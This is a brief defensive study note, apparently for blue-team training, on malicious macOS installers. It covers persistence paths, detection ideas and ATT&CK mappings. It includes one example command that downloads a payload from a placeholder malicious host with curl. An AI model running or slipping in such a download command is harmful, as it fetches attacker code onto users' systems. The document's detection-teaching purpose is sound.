# Trend 08 – Malicious macOS Installers

macOS threats increased significantly, especially adware, stealers, and coinminers.  
Attackers abuse PKG installers and LaunchAgents for persistence.

---

## 🔥 Key Indicators

### 1. Suspicious PKG Installers
Malicious installers often:
- Request unnecessary permissions  
- Drop payloads into hidden directories  
- Install LaunchAgents for persistence  

### 2. LaunchAgents & LaunchDaemons
Common persistence paths:
~/Library/LaunchAgents/
/Library/LaunchDaemons/

Code

### 3. curl Downloads
Malicious installers frequently execute:
curl http://malicious/payload -o /tmp/update

Code

### 4. Unusual Outbound Connections
macOS systems contacting:
- Cryptocurrency mining pools  
- C2 servers  
- Suspicious domains  

---

## 🛡️ Detection Opportunities

- Monitor PKG installer behavior  
- Detect LaunchAgent creation  
- Track curl/wget usage  
- Alert on unsigned binaries  

---

## 🎯 MITRE ATT&CK Mapping

- **T1059.004** – macOS Shell  
- **T1543** – Create or Modify System Process  
- **T1036** – Masquerading  

---

## 🧪 BTLO Relevance

Some BTLO labs simulate:
- macOS persistence  
- curl-based payload downloads  
